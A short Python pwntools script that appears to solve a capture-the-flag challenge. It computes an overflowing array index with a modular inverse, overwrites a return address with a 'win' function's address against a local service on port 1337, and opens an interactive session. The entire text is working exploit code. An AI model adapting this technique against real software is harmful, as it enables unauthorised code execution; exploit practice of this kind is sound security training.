from pwn import *
from math import gcd

elf = ELF("index")
context.binary = elf
context.log_level = "debug"
a = 100
n = 2 ** 64
padding = 0x80 + 8
messages = elf.sym["MESSAGES"]
win = elf.sym["win"]
b = 96
g = gcd(a, n)
new_a = a // g
assert b % g == 0
new_b = b // g
new_n = n // g
x = pow(new_a, -1, new_n) * new_b % new_n
assert (a * x + messages) % n == messages + b
p = remote("localhost", 1337)
p.sendline(b"1")
p.sendline(b"0")
p.sendline(b"A" * b)
pause()
p.sendline(b"1")
p.sendline(str(x).encode())
p.sendline(b"A" * (padding - b) + p64(win))
pause()
print(hex(win))
p.sendline(b"2")
p.sendline(b"0")
p.sendline(b"3")
p.interactive()
